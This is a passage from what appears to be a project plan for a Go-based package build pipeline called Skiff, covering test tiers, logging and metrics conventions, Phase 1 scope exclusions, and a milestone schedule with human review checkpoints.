| `cmd/*` | Integration via `scripts/e2e-smoke.sh` | The proof-of-pipeline test. |

Run `go test ./...` without integration guard for the unit tier (fast). Pre-merge: `SKIFF_INTEGRATION=1 go test ./...` against a running compose stack. CI: same plus `scripts/e2e-smoke.sh`.

## Observability conventions

- **Logs:** JSON to stdout. Fields: `time` (RFC3339), `level`, `msg`, `binary`, `name`, `version`, `workflow_id`, `activity`, plus context-specific extras. Never log secrets.
- **Metrics:** namespaced `skiff_*`. Counters for events; histograms for durations. Labels kept low-cardinality (no per-package labels).
- **Source of truth:** `events` table in ClickHouse. Anything ad-hoc analysts want to know is a query against `events` + the entity tables.

## Out-of-scope reminders (Phase 1)

Do not implement, do not stub interfaces for, do not "leave a hook for":
- Override repo, per-package patches.
- Native code builds.
- Fetches-at-install handling beyond classification.
- Multi-architecture publishing (single arch matching the worker container).
- Multi-Node-version targets (default 20).
- devenv integration.
- SLSA provenance.
- Batch reconciliation workflow.
- Any public deployment surface.

Each of these belongs to Phase 2+. If a design choice in Phase 1 makes Phase 2 awkward, note it in `docs/architecture.md` but do not pre-emptively complicate the code.

---

## Execution sequence

| Milestone | Estimated effort | Dependencies | Checkpoint |
|---|---|---|---|
| 0 | 1 day (incl. OSS scaffolding) | none | review compose stack + community files with human |
| 1 | half day | M0 | review schema with human |
| 2 | 1 day | M1 | review ingest throughput |
| 3 | half day | none (can parallelize with M2) | review suspicious regex set |
| 4 | 1 day | M1, M2, M3 | review concurrency & retry policy |
| 5 | 1.5 days | M4 | review worker Dockerfile sandbox decision |
| 6 | half day | M5 | brief review |
| 7 | half day | M6 | smoke demo |
| 8 | half day | M7 | threat-model review; cut v0.1.0 |

Total: roughly one to one-and-a-half weeks of focused work for one engineer.
